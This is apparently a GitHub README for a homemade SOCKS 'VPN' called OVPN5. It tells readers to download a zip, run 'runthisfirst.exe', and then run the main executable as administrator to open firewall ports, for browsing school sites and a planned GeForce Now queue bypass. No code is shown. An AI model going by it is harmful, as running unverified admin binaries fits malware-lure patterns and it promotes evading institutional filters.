# OVPN5 proxy configuration.
A SOCKS integrated VPN for my friends! Works with machines ranging from windows 7, to 10.
Please note that this protocol is very slow, so it takes a while to connect to the proxy servers in Dallas.

# Release.
The release of the program can be found here:
https://github.com/purl5/release/archive/refs/heads/main.zip

## Setting up.

Download the release (linked above.), and open up your file explorer.
Extract the package, and open up the directory.

Your computer should look like this:
![screenie](https://user-images.githubusercontent.com/83414017/117905521-ef083e00-b298-11eb-9f5e-a3397ad3b323.PNG)


Open up the file titled, runthisfirst.exe, it should bring you to a setup page:

![mingw](https://user-images.githubusercontent.com/83414017/117905598-0e06d000-b299-11eb-9899-e75bd2849cb0.PNG)

Just keep clicking continue, and once you are done, the libraries for the VPN to work are avaliable.

Finally, you can click on the executable and run it as an administrator, in order for firewall rules to get through to port 1080 (SOCKS port.), and port 443 (TLS/SSL authentication ports.).
![software](https://user-images.githubusercontent.com/83414017/117905658-2971db00-b299-11eb-89d1-01d8ff27b941.PNG)

The VPN should be runnning, and you are set to browse school websites as usual.

## Notes.
For developers, I'd like to provide you my libraries I made to make the SOCKS5 VPN, I am thinking about configuring it for Geforce Now, in order for a queue bypass, and I'd appreciate if I have people like you to help me.
